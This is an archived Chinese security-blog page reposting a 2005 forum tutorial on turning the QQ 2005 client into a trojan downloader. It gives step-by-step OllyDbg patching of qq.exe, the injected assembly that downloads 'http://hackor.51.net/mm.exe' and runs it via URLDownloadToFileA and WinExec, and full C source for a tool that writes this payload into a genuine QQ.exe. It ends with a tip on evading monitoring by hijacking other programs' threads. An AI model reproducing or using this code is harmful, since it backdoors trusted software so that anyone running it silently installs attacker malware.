@@ -1,0 +1,943 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>把qq2005做成后门之编程实现 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="把qq2005做成后门之编程实现。平心而论，我不怎么喜欢那些全是操作的文章，从头到尾都是先这样，再那样。几乎学不到什么东西。比如讲某个木马，怎么反弹端口，怎么隐蔽，就是不给出思路的。实在不利于我们菜鸟的学习。牢骚几句，首先，我们来手工把qq2005做成后门(必要的过程)，然后在具体分析，思路是怎么横空出世的。" />
+<meta name="keywords" content="把qq2005做成后门之编程实现" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/2179/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="把qq2005做成后门之编程实现" />
+<meta property="og:description" content="把qq2005做成后门之编程实现。平心而论，我不怎么喜欢那些全是操作的文章，从头到尾都是先这样，再那样。几乎学不到什么东西。比如讲某个木马，怎么反弹端口，怎么隐蔽，就是不给出思路的。实在不利于我们菜鸟的学习。牢骚几句，首先，我们来手工把qq2005做成后门(必要的过程)，然后在具体分析，思路是怎么横空出世的。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/2179/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2005-05-31T17:12:29&#43;08:00" />
+<meta property="article:modified_time" content="2012-01-30T19:49:20&#43;08:00" />
+
+<meta itemprop="name" content="把qq2005做成后门之编程实现">
+<meta itemprop="description" content="把qq2005做成后门之编程实现。平心而论，我不怎么喜欢那些全是操作的文章，从头到尾都是先这样，再那样。几乎学不到什么东西。比如讲某个木马，怎么反弹端口，怎么隐蔽，就是不给出思路的。实在不利于我们菜鸟的学习。牢骚几句，首先，我们来手工把qq2005做成后门(必要的过程)，然后在具体分析，思路是怎么横空出世的。"><meta itemprop="datePublished" content="2005-05-31T17:12:29&#43;08:00" />
+<meta itemprop="dateModified" content="2012-01-30T19:49:20&#43;08:00" />
+<meta itemprop="wordCount" content="2976">
+<meta itemprop="keywords" content="QQ,编程,后门,Ascii,exe,HTTP,URL,程序,代码,分析,汇编,思路,文件," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="把qq2005做成后门之编程实现"/>
+<meta name="twitter:description" content="把qq2005做成后门之编程实现。平心而论，我不怎么喜欢那些全是操作的文章，从头到尾都是先这样，再那样。几乎学不到什么东西。比如讲某个木马，怎么反弹端口，怎么隐蔽，就是不给出思路的。实在不利于我们菜鸟的学习。牢骚几句，首先，我们来手工把qq2005做成后门(必要的过程)，然后在具体分析，思路是怎么横空出世的。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">把qq2005做成后门之编程实现</h1>
+      
+      <div class="post-meta">
+        <time datetime="2005-05-31" class="post-time">
+          2005-05-31
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/qq/"> QQ </a>
+            <a href="https://lcx.cc/categories/%E7%BC%96%E7%A8%8B/"> 编程 </a>
+            <a href="https://lcx.cc/categories/%E5%90%8E%E9%97%A8/"> 后门 </a>
+            
+          </div>
+        <span class="more-meta"> 约 2976 字 </span>
+          <span class="more-meta"> 预计阅读 6 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	刚转载的一篇文章和这个有关联，就顺道转过来了，文中图片已挂，也找不到了，年代太久了，反正不重要，将就着看吧……
+</p>
+<p style="text-indent:2em;">
+	不死的 shellcode：<a href="https://lcx.cc/post/2178/" target="_blank">https://lcx.cc/post/2178/</a>
+</p>
+<hr />
+<p style="text-indent:2em;">
+	标 题: 把qq2005做成后门之编程实现(简单，高手勿入)
+</p>
+<p style="text-indent:2em;">
+	作 者: ngaut
+</p>
+<p style="text-indent:2em;">
+	时 间: 2005-05-31,17:12:29
+</p>
+<p style="text-indent:2em;">
+	链 接: http://bbs.pediy.com/showthread.php?t=14093
+</p>
+<p style="text-indent:2em;">
+	<!-- google_ad_section_start  -->把qq2005做成后门之编程实现（原创）
+</p>
+<p style="text-indent:2em;">
+	1。思路篇
+</p>
+<p style="text-indent:2em;">
+	平心而论，我不怎么喜欢那些全是操作的文章，从头到尾都是先这样，再那样。几乎学不到什么东西。
+</p>
+<p style="text-indent:2em;">
+	比如讲某个木马，怎么反弹端口，怎么隐蔽，就是不给出思路的。实在不利于我们菜鸟的学习。牢骚几句，
+</p>
+<p style="text-indent:2em;">
+	开始正题：
+</p>
+<p style="text-indent:2em;">
+	首先，我们来手工把qq2005做成后门(必要的过程)，然后在具体分析，思路是怎么横空出世的。
+</p>
+<p style="text-indent:2em;">
+	因为编程实现不过是把手工的过程变成了自动的过程而已。这里又面临一个选择，是详细写出用ollydbg修改qq的详细过程，还是一笔带过呢？考虑到《逆》一文中的这个过程被一笔带过了(肯定带来的不少我等菜鸟的痛苦)，所以我选择详细写出这个过程。这样才算手把手的教，是吧。由于我很讨厌抓图，所以一部分过程我就不抓图了。
+</p>
+<p style="text-indent:2em;">
+	用ollydbg打开qq.exe，这时候程序会停在入口点，F2下个断点，为什么呢？因为要么要修改qq的入口代码。
+</p>
+<p style="text-indent:2em;">
+	下断点后，很容易在找到这个位置，按ALT+B，双击断点，又回到入口了吧，是不是很方便。呵呵
+</p>
+<p style="text-indent:2em;">
+	拖动CPU窗口的滚动条，到qq.exe的尾部，找到一大片的全是&nbsp;db&nbsp;0&nbsp;的地方，这个可以理解为PE的空隙。
+</p>
+<p style="text-indent:2em;">
+	我找到的地址是004D4D90，按着鼠标左键向下拖动，选中的部分是黄色的，按CTRL+E或者右键－&gt;二进制-&gt;编辑,&nbsp;输入要下载的后门的地址："http://hackor.51.net/mm.exe"(不包括引号)，&nbsp;回车，看到一堆不知道是什么的汇编代码吧，没有关系，CTRL+A分析一下，好看多了吧，如图1。
+</p>
+<p style="text-indent:2em;">
+	同样的方法在004D4DCD(距离004D4D90比较远，是为了留出足够的空间来存放比较长的URL)添加"d:\\ok.exe",如图2。
+</p>
+<p style="text-indent:2em;">
+	继续添加如下汇编代码(为什么这样添加呢，随后给出)：
+</p>
+<pre class="prettyprint">004D4DEB       60              pushad
+004D4DEC       6A 00           push 0
+004D4DEE    .  6A 00           push 0
+004D4DF0    .  68 CD4D4D00     push QQ.004D4DCD                    ;  ASCII "d:\\ok.exe"
+004D4DF5    .  68 904D4D00     push QQ.004D4D90                    ;  ASCII "http://hackor.51.net/mm.exe"
+004D4DFA    .  6A 00           push 0
+004D4DFC    .  E8 CAEBBC75     call urlmon.URLDownloadToFileA
+004D4E01    .  61              popad
+004D4E02    .  60              pushad
+004D4E03    .  6A 05           push 5                              ; /ShowState = SW_SHOW
+004D4E05    .  68 CD4D4D00     push QQ.004D4DCD                    ; |CmdLine = "d:\\ok.exe"
+004D4E0A    .  E8 26AF9777     call kernel32.WinExec               ; \WinExec
+004D4E0F    .  61              popad
+004D4E10    .  C3              retn
+004D4E11       00              db 00
+004D4E12       00              db 00
+004D4E13    &gt;  60              pushad
+004D4E14    .  6A 00           push 0                              ; /arg = NULL
+004D4E16    .  6A 00           push 0                              ; |stksize = 0
+004D4E18    .  68 EB4D4D00     push QQ.004D4DEB                    ; |start = QQ.004D4DEB
+004D4E1D    .  E8 65307377     call MSVCRT._beginthread            ; \_beginthread
+004D4E22    .  61              popad
+
+
+004D4E23    .  55              push ebp
+004D4E24    .  8BEC            mov ebp,esp
+004D4E26    .  6A FF           push -1
+004D4E28    .^ E9 30FDF8FF     jmp QQ.00464B5D</pre>
+<p style="text-indent:2em;">
+	按CTRL+A分析一下，看到了什么：
+</p>
+<p style="text-indent:2em;">
+	004D4DEB&nbsp;&nbsp;&nbsp;&nbsp;.&nbsp;&nbsp;60&nbsp;6A&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ascii&nbsp;"`j",0
+</p>
+<p style="text-indent:2em;">
+	004D4DEB居然变成了这个，呵呵，用ollydbg的小技巧，选中这行，右键-&gt;分析-&gt;在下一次分析期间，将选择视为命令。呵呵，ok了吧。编辑的时候还会出现其它的不好看的东西，那是ollydbg分析错误导致的，需要手动调整，视为命令，字符等等(具体情形请自行分析)。
+</p>
+<p style="text-indent:2em;">
+	现在来回答为什么这样添加的问题：004D4E18处压入的是004D4DEB(也就是URLDownloadToFileA的地址)，这样当这个_beginthread启动的时候，会调用URLDownloadToFileA，去下载我们的mm.exe，紧接着执行WinExec函数，这样我们下载的mm.exe就被执行了，最后用retn返回。其中004D4E22到004D4E26是qq的入口代码，为了不影响qq的运行，我们还是要保存地。
+</p>
+<p style="text-indent:2em;">
+	下面接着修改qq的入口代码，使之跳到004D4E13去执行我们的_beginthread。注意修改前请先保存，右键－&gt;复制到可执行文件，选择一个文件名就ok了。
+</p>
+<p style="text-indent:2em;">
+	修改后(如图3)：
+</p>
+<p style="text-indent:2em;">
+	00464B58&nbsp;Q&gt;&nbsp;$&nbsp;/E9&nbsp;B6020700&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;QQ.004D4E13
+</p>
+<p style="text-indent:2em;">
+	00464B5D&nbsp;&nbsp;&nbsp;&nbsp;&gt;&nbsp;|68&nbsp;18104E00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;QQ.004E1018
+</p>
+<p style="text-indent:2em;">
+	修改完成后，右键复制到可执行文件，全部修正。
+</p>
+<p style="text-indent:2em;">
+	整个过程要注意堆栈平衡。上面的pushad和popad就是用来保持堆栈平衡的。
+</p>
+<p style="text-indent:2em;">
+	2。具体编程实现：
+</p>
+<p style="text-indent:2em;">
+	有了前面的过程，这个就简单了。用什么语言实现都一样，看你的个人爱好了。我用的c语言
+</p>
+<p style="text-indent:2em;">
+	我们&nbsp;的程序就是修改qq，把正常的qq.exe修改成上面这样的。那么要修改那些地方呢？
+</p>
+<p style="text-indent:2em;">
+	有2个办法，用ollydbg同时开修改后的qq.exe和修改前的qq.exe，对比发现即可。但是不太方便。
+</p>
+<p style="text-indent:2em;">
+	还可以使用Hex&nbsp;Workshop，我用的就是这个，它可以比较2个文件，下载地址：http://www.pediy.com/tools/Editors/Hex%20workshop/Hex%20workshop%204.23.zip
+</p>
+<p style="text-indent:2em;">
+	安装完成后，打开Hex&nbsp;Workshop，CTRL+K,选择路径，如图4，ok
+</p>
+<p style="text-indent:2em;">
+	F6将自动定位到不同之处。
+</p>
+<p style="text-indent:2em;">
+	偏移为：
+</p>
+<p style="text-indent:2em;">
+	0x64b58
+</p>
+<p style="text-indent:2em;">
+	0xD4D90
+</p>
+<p style="text-indent:2em;">
+	0xd4dcd
+</p>
+<p style="text-indent:2em;">
+	0xd4deb
+</p>
+<p style="text-indent:2em;">
+	我们只需要编程修正以上地方的代码就可以了，还有一个问题是，我怎么知道要修正多少个字节呢？
+</p>
+<p style="text-indent:2em;">
+	用Hex&nbsp;Workshop计算一下就知道了啊(2个地址相减就ok了)，修正字节数并不要求特别准确。不影响程序的运行就可以了。
+</p>
+<p style="text-indent:2em;">
+	整个程序如下(非常简单)：
+</p>
+<pre class="prettyprint lang-cpp"> //winxp sp1 + qq2005
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char* argv[])
+{
+  FILE *fp;
+  unsigned int i;
+  int entryPoint[] = {233,182,2,7,0};  //入口要修正的字节
+  char *pDownURL = NULL;    //指向下载URL的指针
+  char *pPathAndFileName = NULL;   //指向文件路径和文件名的指针
+  int backDoor[] = 
+  {
+      96,106,0,106,0,104,205,77,77,0,104,144,
+      77,77,0,106,0,232,202,235,188,117,
+      97,96,106,5,104,205,77,77,0,232,38,
+      175,151,119,97,195,0,0,96,106,0,106,
+      0,104,235,77,77,0,232,101,48,115,
+      119,97,85,139,236,106,255,233,48,
+      253,248,255,0
+  };
+
+      if(argc != 3)
+      {
+    printf("\n\t\t Make qq to be downloader\n");
+    printf("\n\t\t\t\tngaut All rights reserved.\n\n");
+          printf("Usage: %s &lt;downloadURL&gt; &lt;pathAndFileName&gt; \n", argv[0]);
+    printf("%s and qq.exe should at the same directory\n", argv[0]);
+    printf("The os should be winxp sp1 and The qq version should be 2005\n");
+    printf("pathAndFileName should like:\n\t d:\\\\mm.exe not d:\\mm.exe\n");
+          return 1;
+      }
+  
+  pDownURL = argv[1];
+  pPathAndFileName = argv[2];
+  
+  printf("\n\t\t Make qq to be downloader\n");
+  printf("Cracking......\n");
+  
+  // 1. 打开文件qq.exe ,这个是正常的qq.exe
+  if ((fp = fopen("QQ.exe", "r+"))==NULL)
+  {                    
+    printf("error!!!  Can not open qq.exe!!!\n\n");
+    printf("Press any key to continue\n");
+    getchar();
+    exit(0);
+  }
+  
+  //2. set entry point
+  fseek(fp, 0x64b58, SEEK_SET);  
+  for (i=0; i&lt;5; i++)
+  {
+    fputc( (char)entryPoint[i], fp);
+  }
+
+  // 3. set downURL
+  fseek(fp, 0x00D4D90, SEEK_SET);
+  
+  for (i=0; i&lt;strlen(pDownURL); i++)
+  {
+    fputc(pDownURL[i], fp);
+  }
+  fputc(0, fp);    //这里写入0，因为必须要以0结尾，下同
+
+  // 4. set pathAndFileName
+  fseek(fp, 0xd4dcd, SEEK_SET);
+  
+  for (i=0; i&lt;strlen(pPathAndFileName); i++)
+  {
+    fputc(pPathAndFileName[i], fp);
+  }
+  fputc(0, fp);
+
+  // 5. set backDoor code
+  fseek(fp, 0xd4deb, SEEK_SET);
+  
+  for (i=0; i&lt;66; i++)
+  {
+    fputc( (char)backDoor[i], fp);
+  }
+
+  fclose(fp);
+  
+  printf("\nThanks for using, already cracked!!!\n");
+  printf("\n\t\t\t\tngaut All rights reserved.\n\n");
+  
+  return 0;
+}</pre>
+<p style="text-indent:2em;">
+	上面的i用于控制要写入的字节数，并不需要非常精确，但是不要影响程序的执行。每次写入前都要用fseek函数移动文件指针到指定位置。用ollydbg看看程序的反汇编代码，你会发现backDoor就是我们后门关键部分对应的汇编代码，上面的程序有个小技巧，那就是如何得到entryPoint和backDoor数组的内容。而且可以看到它们都是int，使用时才被转化为char下面的代码用于得到entryPoint数组和backDoor数组的内容(个人方法很巧妙)：
+</p>
+<pre class="prettyprint lang-cpp">//winxp sp1 + qq2005
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char* argv[])
+{
+  FILE *fp;
+  unsigned int i;
+  
+  // 1. 打开文件qq.exe, 注意这个qq是修改过的
+  if ((fp = fopen("QQ.exe", "r+"))==NULL)
+  {                    
+    printf("error!!!  Can not open qq.exe!!!\n\n");
+    printf("Press any key to continue\n");
+    getchar();
+    exit(0);
+  }
+  
+  
+  //get entryPoint code
+  fseek(fp, 0x64b58, SEEK_SET);
+  for (i=0; i&lt;5; i++)
+  {
+    printf("%d,", fgetc(fp));
+  }
+  printf("\n\n");
+  
+  fseek(fp, 0xd4deb, SEEK_SET);
+  
+  for (i=0; i&lt;67; i++)
+  {
+    printf("%d,", fgetc(fp));
+  }
+  printf("\n\n");
+  
+  fclose(fp);
+  
+
+  return 0;
+}</pre>
+<p style="text-indent:2em;">
+	运行结果如图5，真漂亮，呵呵。
+</p>
+<p style="text-indent:2em;">
+	编程介绍完了。怎么样，还算简单吧。
+</p>
+<p style="text-indent:2em;">
+	最后补充一点，我们创建线程还是逃不过某些软件的监视，那么我们该怎么解决呢。我们自己不创建就行了，借用别人的啊，比如flashget多线程下载，再说了，现在太多的软件都创建线程，只要不我们的代码挂上别人的线程就可以了，winxp&nbsp;sp2&nbsp;和&nbsp;flashget1.65测试成功，未做更多的测试，应该是可以的。我想这个方法可以叫做借尸还魂吧，呵呵，具体修改过程以及对应的代码分析就不写了，手指都麻了，好了，下次见。
+</p>
+<p style="text-indent:2em;">
+	趁自己还年轻，多写点东西贡献给大家。也算是自己人生一大志愿。总体来说我写的东西都很简单，因为我就是一菜鸟，写不出什么高难度的东西来。^_^
+</p>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Nuclear'Atk</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2012-01-30
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/qq/">QQ</a>
+          <a href="https://lcx.cc/tags/%E7%BC%96%E7%A8%8B/">编程</a>
+          <a href="https://lcx.cc/tags/%E5%90%8E%E9%97%A8/">后门</a>
+          <a href="https://lcx.cc/tags/ascii/">Ascii</a>
+          <a href="https://lcx.cc/tags/exe/">exe</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/url/">URL</a>
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E5%88%86%E6%9E%90/">分析</a>
+          <a href="https://lcx.cc/tags/%E6%B1%87%E7%BC%96/">汇编</a>
+          <a href="https://lcx.cc/tags/%E6%80%9D%E8%B7%AF/">思路</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/2192/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">可缓存的动态页面设计 控制浏览器、缓存服务器缓存动态页面</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/2288/">
+            <span class="next-text nav-default">C#语言病毒旨在攻击.Net 17岁美媚黑客一举成名 荷兰美女黑客</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 